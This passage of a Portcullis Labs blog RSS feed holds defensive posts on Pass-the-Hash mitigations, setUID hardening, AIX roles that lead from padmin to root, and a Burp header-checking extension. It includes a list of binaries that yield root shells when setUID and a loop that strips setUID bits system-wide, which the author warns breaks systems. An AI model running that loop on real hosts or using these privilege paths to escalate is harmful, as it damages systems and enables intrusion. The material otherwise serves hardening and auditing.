+<pre class="brush: bash; gutter: false; title: ; notranslate">
+Local Policies &gt; Administrative Templates &gt; SCM: Pass the Hash Mitigations &gt; Wdigest Authentication
+</pre>
+<h2>Apply enhanced credentials protection updates</h2>
+<p>In addition to the protections added by KB2871997, Microsoft have released an updated that further protects against Pass the Hash (PtH) attacks for Windows 7, Windows 8, Server 2008 R2 and Server 2012. </p>
+<h2>KB3126593 (MS16-014)</h2>
+<p>This update adds support for the TokenLeakDetectDelaySecs Registry setting which can be used to force credentials to be cleared after a user logs off. To set clearing credentials 30 seconds after user logout (the default behaviour in Windows 8.1 and Windows 10), configure the following Registry setting:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+Registry Path: HKLM\System\CurrentControlSet\Control\Lsa
+Key Name: TokenLeakDetectDelaySecs
+Key Type: REG_DWORD
+Key Value: 30
+</pre>
+<h2>Upgrade Windows servers and workstations</h2>
+<p>With each new version of Windows, Microsoft adds additional security features, including protections for the LSASS service to protect against credential stealing and adding additional logging options. Upgrade servers to Server 2016 and upgrade workstations to Windows 10 and configure them to make use of these new features. </p>
+<h2>Enable event monitoring and investigate alerts</h2>
+<p>A centralised logging and monitoring solution provides an opportunity for recording actions and events that take place on systems, and prevents a successful attacker from clearing the event log to hide their actions.</p>
+<p>Configure all Windows systems to log events to a centralised system and monitor for account login attempts (both successful and unsuccessful).<br />
+Any events that reference local accounts (or Domain Administrator/privileged accounts) and not Domain accounts should be investigated as a matter of priority. </p>
+<p>The following Windows event codes are generated by Windows 2008 and later:</p>
+<ul>
+<li>Event ID: 4624: Account login successful</li>
+<li>Event ID: 4625: Account login failed</li>
+</ul>
+<p>The corresponding events for Windows 2003 and earlier:</p>
+<ul>
+<li>Event ID: 528: Account login successful</li>
+<li>Event ID: 540: Network account login successful</li>
+<li>Event ID: 529: Login failure &#8211; Unknown user or bad password</li>
+</ul>
+<p>Other potentially interesting event code are:</p>
+<ul>
+<li>Event ID: 4625: An account failed to login (Windows 2008 and later)</li>
+<li>Event ID: 531: Login failure &#8211; Account currently disabled (Windows 2003 and earlier)</li>
+</ul>
+<h2>Conclusion</h2>
+<p>A number of options have been presented to hinder Lateral Movement attacks, and some readers might be wondering which option to implement. The answer is &#8220;all of them, where possible&#8221;. Security is a &#8220;defence in depth&#8221; game, and every obstacle that an attacker has to work around is worth implementing.</p>
+<p>In addition to hindering lateral movement, monitoring for attacks or suspicious behaviour and investigating alerts will help identify more sophisticated attacks, as well as indicating that suspicious activities are occurring.</p>
+<p>A <a href="https://blogs.cisco.com/security/can-your-organisation-be-breached-find-out-with-a-red-team" title="Red Team">Red Team Assessment</a> can be undertaken to determine the effectiveness of the security controls in place during an attack against your network. Whilst the assessment is taking place it also provides an opportunity to determine whether the internal monitoring and response capabilities intended to detect and alert when a potential attack is occurring within your network are effective. Following completion of the assessment you will have a clear view of any additional measures that should be implemented to improve both defence and monitoring capabilities within your network.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/hindering-lateral-movement/">Hindering Lateral Movement</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/hindering-lateral-movement/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>UNIX and Linux setUID advice and guidance</title>
+		<link>https://labs.portcullis.co.uk/blog/unix-and-linux-setuid-advice-and-guidance/</link>
+		<comments>https://labs.portcullis.co.uk/blog/unix-and-linux-setuid-advice-and-guidance/#comments</comments>
+		<pubDate>Fri, 16 Jun 2017 14:41:53 +0000</pubDate>
+		<dc:creator><![CDATA[AFC]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[AIX]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[blue team]]></category>
+		<category><![CDATA[FreeBSD]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[root]]></category>
+		<category><![CDATA[Solaris]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=5793</guid>
+		<description><![CDATA[<p>It is a topic that often comes up on client engagements, usually when running structured build reviews of Linux &#8220;gold builds&#8221;, but occasionally when trying to explain in detail how we used a Linux system to pivot internally. SetUID and setGID files are inevitably a risk, potentially allowing attackers to elevate privileges to root from [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/unix-and-linux-setuid-advice-and-guidance/">UNIX and Linux setUID advice and guidance</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>It is a topic that often comes up on client engagements, usually when running structured build reviews of Linux &#8220;gold builds&#8221;, but occasionally when trying to explain in detail how we used a Linux system to pivot internally.</p>
+<p>SetUID and setGID files are inevitably a risk, potentially allowing attackers to elevate privileges to root from a basic user. When shared out on SMB or NFS shares they can spread the risk even further.<span id="more-5793"></span></p>
+<p>One good approach would be:</p>
+<p>&#8220;The only good setUID is a chmod -s setuid&#8221; i.e. deactivate this particular functionality.</p>
+<p>However, sysadmins may (understandably) get a bit wobbly when we suggest this and come up with a number of fairly valid reasons why this is tricky. They have a point to some extent, but this is 2017 and we should be biting some of these bullets.</p>
+<p>Yes, reducing the risk in this area is tough, but it is in fact a good start in defining least privilege security controls. You can learn how little or how much power individual users require and manage this accordingly. You can also test your changes before rolling them out and sanity check the advice given.</p>
+<p>At the very least we need a list of files that should not be setUID that we can give to sysadmins and, with confidence, recommend removing or changing the permissions. A pragmatic strategy for mitigating the risks incurred would also be good.</p>
+<h2>So what are they?</h2>
+<p>SetUID/setGID bits are file permissions set on binary files when we need them to run with the permissions of the owner (setUID) or the group (setGID) that owns the file, usually a root or equivalent user. Historically this functionality was entrenched in UNIX and Linux and was necessary, up to a point, for a system to function as intended.</p>
+<p>Many vendors are now working toward eliminating the requirement for these permissions and UNIX based systems can be configured, with some care, not to use them.</p>
+<p>We potentially have 3 categories of setUID and setGID files:</p>
+<h3>The &#8220;naughty&#8221; list</h3>
+<ul>
+<li>May have become setUID by accident, installation of third-party software, malicious activity or sloppy coding and should almost certainly not be allowed</li>
+<li>tar, find, vi, etc</li>
+<li>Likely high risk to get root easily</li>
+<li>Epic fail -rwsrw-rw- More common than you would think</li>
+<li>Vendor supplied software often a culprit</li>
+</ul>
+<h3>The &#8220;remove&#8221; list</h3>
+<ul>
+<li>Redundant, legacy or not really required to be setUID</li>
+<li>rcp, arping, etc</li>
+<li>Likely low risk but should be easy to remove</li>
+</ul>
+<h3>The &#8220;allowed&#8221; list</h3>
+<ul>
+<li>OS may fail to function as expected if setUID is removed without care</li>
+<li>For example passwd, sudo</li>
+<li>Should be mitigated to minimise risks</li>
+<li>Many can be reclassified as 2 above and have the setUID bit removed</li>
+</ul>
+<p>We report on categories 1 (naughty) and 2 (remove) scoring appropriate to the risk and ease of exploitation. We report on 3 (allowed) with recommendations to mitigate.</p>
+<p>For example, a setUID on the find command (or any shell command with abilities to run other programs or shells) would be a high risk vulnerability allowing regular users to become root fairly easily.</p>
+<h2>How to deal with these issues?</h2>
+<p>The approach to recommend to customers:</p>
+<ol>
+<li>Audit &#8211; find all setUID and setGID files on the system locally and on all filesystems not mounted nosetuid</li>
+<li>Validate &#8211; elfsign and cross checks against vendor checksums</li>
+<li>Eliminate where possible &#8211; uninstall, chmod -s or rm</li>
+<li>Mitigate where necessary &#8211; FIM, auditing, remote logging, mount NAS nosetuid</li>
+</ol>
+<p>This applies primarily to common Linux distributions. Solaris and AIX for example may have slightly different filenames and locations, but similar principles apply.</p>
+<p>The ubiquitous sudo or other equivalent tools can be used to configure fine grained privilege management without the requirement for setUID permissions. Your version of sudo must be up to date, the sudoers configuration files must be secure and have a strictly limited set of commands allowed per user or group.</p>
+<p>Customers need to consider how the remediation and mitigation steps fit within their overall strategies for user and privilege management alongside local and remote file permissions.</p>
+<p>For example:</p>
+<p>Do they have a good FIM solution and can they utilise remote logging as a mitigation? Do they wish to work at the standard build level and have a hardened standard build? If so, then maybe they&#8217;re in the right place to look at removing these permissions?</p>
+<p>In particular File Integrity Monitoring, which should focus on the most vulnerable files on a system, should track any changes to the files with the setUID/setGID bit set. Any changes should be audited and remotely logged to ensure that an attacker cannot cover their tracks.</p>
+<p>Other mitigation techniques include SELinux and other RBAC mechanisms on Linux, Trusted Execution and Trusted Computing Base on AIX and RBAC on Solaris.</p>
+<p>More recent Linux kernels (starting 2.6.26) can make use of capabilities which provide fine-grained control over superuser permissions, allowing use of the root user to be avoided.</p>
+<p>Sysadmins need some encouragement and support in both remediation and mitigation. If something unexpected does not work upon removing a setUID file permission, it is important to try to use that as a learning experience and a consequence of taking least privilege as far as possible.</p>
+<p>At the very least tighten up your sudo configuration and remove as many setUIDs as you can.</p>
+<h3>Finding setUID and setGID files</h3>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+# find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;
+</pre>
+<p>Example output:</p>
+<p>Here is a setUID file:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+-rws--x--x. 1 root root 23960 Sep 23  2016 /usr/bin/chfn
+</pre>
+<p>And here is a setGID file:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+-r-xr-sr-x. 1 root tty 15392 May  4  2014 /usr/bin/wall
+</pre>
+<h3>Just for fun</h3>
+<p>Snapshot a VM of your favourite Linux distro and run the following command (<b>this will break your system in odd ways, so never do it to a production system</b>) and run the following commands:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+# find / -type f -perm -u+s -exec ls -l {} \; |awk '{print $NF}'|grep -v proc &amp;amp;gt; /var/tmp/setUID.lst
+# find / -type f -perm -g+s -exec ls -l {} \; |awk '{print $NF}'|grep -v proc &amp;amp;gt; /var/tmp/setGID.lst
+# for a in `cat /var/tmp/setUID.lst`; do chmod u-s $a; done
+# for a in `cat /var/tmp/setGID.lst`; do chmod g-s $a; done
+</pre>
+<p>See what breaks.</p>
+<p>You can revert to the snapshot if your nerve does not hold.</p>
+<p>You should be able to reboot the machine and log in as a normal user. After that you will discover the limitations you have imposed upon yourself and the operating system.</p>
+<h3>The lists (mid 2017) which are not exhaustive</h3>
+<p>N.B. PATHs to the files may vary&#8230;</p>
+<h3>The &#8220;naughty&#8221; list</h3>
+<ul>
+<li>/usr/bin/awk</li>
+<li>/bin/tar</li>
+<li>/usr/bin/python</li>
+<li>/usr/bin/script</li>
+<li>/usr/bin/man</li>
+<li>/usr/bin/ssh</li>
+<li>/usr/bin/scp</li>
+<li>/usr/bin/git</li>
+<li>/usr/bin/find</li>
+<li>/usr/bin/gdb</li>
+<li>/usr/bin/pico</li>
+<li>/usr/bin/nano</li>
+<li>/usr/bin/zip</li>
+<li>/usr/bin/vi</li>
+<li>/usr/sbin/lsof</li>
+<li>/bin/cat</li>
+<li>/usr/bin/vim</li>
+<li>/usr/bin/gvim</li>
+</ul>
+<p>The point with this list is that they should not really be setUID or setGID and they all have command options that could spawn a shell or otherwise engage in mischief.</p>
+<h3>The &#8220;remove&#8221; list</h3>
+<ul>
+<li>/usr/bin/rcp</li>
+<li>/usr/bin/rlogin</li>
+<li>/usr/bin/rsh</li>
+<li>/usr/libexec/openssh/ssh-keysign</li>
+<li>/usr/lib/openssh/ssh-keysign</li>
+<li>/sbin/netreport</li>
+<li>/usr/sbin/usernetctl</li>
+<li>/usr/sbin/userisdnctl</li>
+<li>/usr/sbin/pppd</li>
+<li>/usr/bin/lockfile</li>
+<li>/usr/bin/mail-lock</li>
+<li>/usr/bin/mail-unlock</li>
+<li>/usr/bin/mail-touchlock</li>
+<li>/usr/bin/dotlockfile</li>
+<li>/usr/bin/arping</li>
+<li>/usr/sbin/uuidd</li>
+<li>/usr/bin/mtr</li>
+<li>/usr/lib/evolution/camel-lock-helper-1.2</li>
+<li>/usr/lib/pt_chown</li>
+<li>/usr/lib/eject/dmcrypt-get-device</li>
+<li>/usr/lib/mc/cons.saver</li>
+</ul>
+<p>Consider removing as a good mitigation strategy.</p>
+<p>Here&#8217;s some others that are usually installed setUID, however, on a hardened system they can usually have their setUID/setGID bits removed:</p>
+<ul>
+<li>/bin/mount</li>
+<li>/bin/umount</li>
+<li>/usr/bin/at</li>
+<li>/usr/bin/newgrp</li>
+<li>/usr/bin/ssh-agent</li>
+<li>/sbin/mount.nfs</li>
+<li>/sbin/umount.nfs</li>
+<li>/sbin/mount.nfs4</li>
+<li>/sbin/umount.nfs4</li>
+<li>/usr/bin/crontab</li>
+<li>/usr/bin/wall</li>
+<li>/usr/bin/write</li>
+<li>/usr/bin/screen</li>
+<li>/usr/bin/mlocate</li>
+<li>/usr/bin/chage</li>
+<li>/usr/bin/chfn</li>
+<li>/usr/bin/chsh</li>
+<li>/bin/fusermount</li>
+<li>/usr/bin/Xorg</li>
+<li>/usr/bin/X</li>
+<li>/usr/lib/dbus-1.0/dbus-daemon-launch-helper</li>
+<li>/usr/lib/vte/gnome-pty-helper</li>
+<li>/usr/lib/libvte9/gnome-pty-helper</li>
+<li>/usr/lib/libvte-2.90-9/gnome-pty-helper</li>
+</ul>
+<h3>The &#8220;allowed&#8221; list</h3>
+<ul>
+<li>/bin/ping</li>
+<li>/bin/su</li>
+<li>/sbin/pam_timestamp_check</li>
+<li>/sbin/unix_chkpwd</li>
+<li>/usr/bin/gpasswd</li>
+<li>/usr/bin/locate</li>
+<li>/usr/bin/passwd</li>
+<li>/usr/libexec/utempter/utempter</li>
+<li>/usr/sbin/lockdev</li>
+<li>/usr/sbin/sendmail.sendmail</li>
+<li>/usr/bin/expiry</li>
+<li>/bin/ping6</li>
+<li>/usr/bin/traceroute6.iputils</li>
+<li>/usr/bin/pkexec</li>
+<li>/usr/bin/sudo</li>
+<li>/usr/bin/sudoedit</li>
+<li>/usr/sbin/postdrop</li>
+<li>/usr/sbin/postqueue</li>
+<li>/usr/sbin/suexec</li>
+<li>/usr/lib/squid/ncsa_auth</li>
+<li>/usr/lib/squid/pam_auth</li>
+<li>/usr/kerberos/bin/ksu</li>
+<li>/usr/sbin/ccreds_validate</li>
+</ul>
+<h2>Final words</h2>
+<p>It&#8217;s worth noting that we know these lists won&#8217;t work for everyone; systems are complex and behaviour is intertwined. That said, no matter what your opinion on the necessity or otherwise of a setUID/setGID bit on a given file, we&#8217;d like to think the approach of knowing which files have the setUID/setGID bit and why is something we can all get on board with.</p>
+<h3>Some good references</h3>
+<ul>
+<li><a title="Understand the setuid and setgid permissions to improve security" href="http://www.techrepublic.com/blog/it-security/understand-the-setuid-and-setgid-permissions-to-improve-security/">Understand the setuid and setgid permissions to improve security</a></li>
+<li><a title="Beware of empty paths" href="https://labs.portcullis.co.uk/blog/beware-of-empty-paths/">Beware of empty paths</a></li>
+<li><a title="Exploiting SUID Executables" href="https://www.pentestpartners.com/security-blog/exploiting-suid-executables/">Exploiting SUID Executables</a></li>
+<li><a title="Capabilities" href="https://wiki.archlinux.org/index.php/Capabilities">Capabilities &#8211; ArchWiki</a></li>
+</ul>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/unix-and-linux-setuid-advice-and-guidance/">UNIX and Linux setUID advice and guidance</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/unix-and-linux-setuid-advice-and-guidance/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>padmin to root: Roles on AIX</title>
+		<link>https://labs.portcullis.co.uk/blog/padmin-to-root-roles-on-aix/</link>
+		<comments>https://labs.portcullis.co.uk/blog/padmin-to-root-roles-on-aix/#comments</comments>
+		<pubDate>Fri, 02 Oct 2015 14:47:26 +0000</pubDate>
+		<dc:creator><![CDATA[TMB]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[AIX]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[root]]></category>
+		<category><![CDATA[UNIX]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=5255</guid>
+		<description><![CDATA[<p>Following a recent post from a consultant at IBM discussing how how privileged access should be performed on VIOS, I figured it was time to share some of our research in this arena. Those of you that are regular readers will know that I love root. For those of you that are new, welcome aboard. [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/padmin-to-root-roles-on-aix/">padmin to root: Roles on AIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Following a recent post from a consultant at IBM discussing how <a title="how privileged access should be performed on VIOS" href="https://www.ibm.com/developerworks/community/blogs/AIXDownUnder/entry/VIOS_switching_between_padmin_and_root1?lang=en">how privileged access should be performed on VIOS</a>, I figured it was time to share some of our research in this arena. Those of you that are regular readers will know that I love <a title="root" href="/tag/root/">root</a>. For those of you that are new, welcome aboard.<span id="more-5255"></span></p>
+<p>Let&#8217;s start by defining what VIOS is. VIOS is a subsystem that runs on a logical partition (LPAR) which manages shared hardware such as disks and network adaptors and allows other LPARs to access them. VIOS is managed via a special padmin account which gives access to a restricted shell from where the hardware can be managed. In practice, however it&#8217;s just another AIX LPAR and as the blog post from IBM notes, setup_oem_env can be used to move from the padmin user to the root user.</p>
+<p>Firstly, note that setup_oem_env is not setUID. So how does it work? Examining the padmin user we see that it has a single role (PAdmin):</p>
+<p>The membership of a role is determined by /etc/security/user but we can examine a specific use using the rolelist command like so:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ rolelist -u padmin
+PAdmin
+</pre>
+<p>You can also find your current active role using the -e flag to rolelist. Moving on, what does the PAdmin role mean?</p>
+<p>Roles are defined in /etc/security/role but as with role membership, we can also use shell commands to enumerate them. For example, the following shows what authorisations the PAdmin role has:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ lsrole PAdmin
+PAdmin
+authorizations=vios.device,vios.fs,vios.install,vios.lvm,vios.network,vios.security,vios.system,vios.oemsetupenv,vios.system.cluster,aix.system.config.artex
+rolelist= groups=staff visibility=1 screens=* dfltmsg= msgcat= auth_mode=INVOKER
+id=23
+</pre>
+<p>In the context of getting root, vios.oemsetupenv is the charm. This and other AIX authorisations are defined in /etc/security/privcmds. It is possible to specify what commands the possessor of the vios.oemsetupenv authorisation can run (and indeed the privileges with which those commands will ultimately be executed).</p>
+<p>You see, AIX like Solaris, is gradually getting rid of the concept that uid=0 is god. IBM haven&#8217;t taken this as far as Oracle yet but there&#8217;s nothing to stop a dedicated administrator from leveraging this functionality. So, if you&#8217;re auditing an AIX box, I would very much recommend checking what roles users have (via /etc/security/user) to ensure that no appropriate roles have been assigned.</p>
+<p>PS I&#8217;ve never seen this used in practice (outside of VIOS), but I&#8217;m sure there will be a first time.<br />
+PPS rolelist -p will tell you what roles a given process has.<br />
+PPPS esaadmin has the SysConfig role but it&#8217;s not normally an active account.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/padmin-to-root-roles-on-aix/">padmin to root: Roles on AIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/padmin-to-root-roles-on-aix/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Burp Extension</title>
+		<link>https://labs.portcullis.co.uk/blog/burp-extension/</link>
+		<comments>https://labs.portcullis.co.uk/blog/burp-extension/#comments</comments>
+		<pubDate>Wed, 26 Aug 2015 12:09:36 +0000</pubDate>
+		<dc:creator><![CDATA[OMC]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[web]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=5225</guid>
+		<description><![CDATA[<p>At Portcullis, one of the more frequent assessments we perform are web application assessments. One of the main challenges we face during these assessments is to look for information that can either help escalate our privileges or allow us to gain access to different functionalities of the web application. Unauthorised access to functionality can often [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/burp-extension/">Burp Extension</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>At Portcullis, one of the more frequent assessments we perform are web application assessments. One of the main challenges we face during these assessments is to look for information that can either help escalate our privileges or allow us to gain access to different functionalities of the web application. Unauthorised access to functionality can often be considered an issue however, testing for this can also lead to information about the type of web server an application is running on, the underlying host and its version.<span id="more-5225"></span></p>
+<p>To check whether an application is out-of-date or is there are any known vulnerabilities associated with said version we must first obtain the server and version information. This can often prove time consuming and can be subject to human error. To improve effectiveness and reduce occurrence of human error we developed a <a href="https://portswigger.net/burp/">BurpSuite</a> extension that checks whether the server discloses any information within the response headers and automatically adds the issue to an issues list.</p>
+<p>In addition to checking for disclosed information, the extension with also make a request to the web server’s main page for the latest version and compare this to the application in question to confirm that the application in question is the most up to date available. The most common web servers, and some others, are already bundled with the extension. However, the extension also provides a configuration tab in which the headers that are checked for information disclosure can be modified, removed or added. This also applies to the software, URLs and REGEX used to access the latest versions.</p>
+<p style="text-align: left;"><a name="imageclose-5226"><div class="lb-album"><a href="#image-5226"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2015/08/BURPEXTENSION-300x254.png" alt="BURPEXTENSION" class="size-medium wp-image-5231 aligncenter"><span></span></a></div>              
+<a href="#imageclose-5226" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-5226">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2015/08/BURPEXTENSION.png" alt="image-5226">
+                   </div></a></p>
+<p>In the above image, you will see that there are two other pieces of functionality bundled with the extension. The first, following the same line of enquiry as the previous (checking the server’s response headers), the extension is also able to check for missing security headers. As before, whilst most of the security headers are already bundled with the extension, it is possible to add more/alternative headers to be check for. Additionally, there is an option to add an informational issue if any of the security headers are found.</p>
+<p>The second functionality is a default burp state restorer. Following good practice, a new assessment would start with a clean burp state. To improve efficiency, instead of repeatedly loading the same path state, you can use the extension to load a state file from any chosen path. This will save you at least 4 clicks and you won’t forget to configure anything when starting burp.</p>
+<p>Finally, the last piece of functionality provided by the extension is a new tab on the request and response editor window that parses a JSON object and prints it with indentation, making it easier to read. This will prove useful when dealing with web services or AJAX requests with JSON responses.</p>
+<p>It should be noted that when reporting the information disclosure and the missing headers issues, only one issue is reported per host. In cases where different finding appear in later responses, further issues will be added with the new findings.</p>
+<p>The source code of the application can be found at : <a href="https://github.com/eonlight/BurpExtenderHeaderChecks">https://github.com/eonlight/BurpExtenderHeaderChecks</a></p>
+<p><em>This blog post was written by Ruben</em></p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/burp-extension/">Burp Extension</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/burp-extension/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+	</channel>
+</rss>
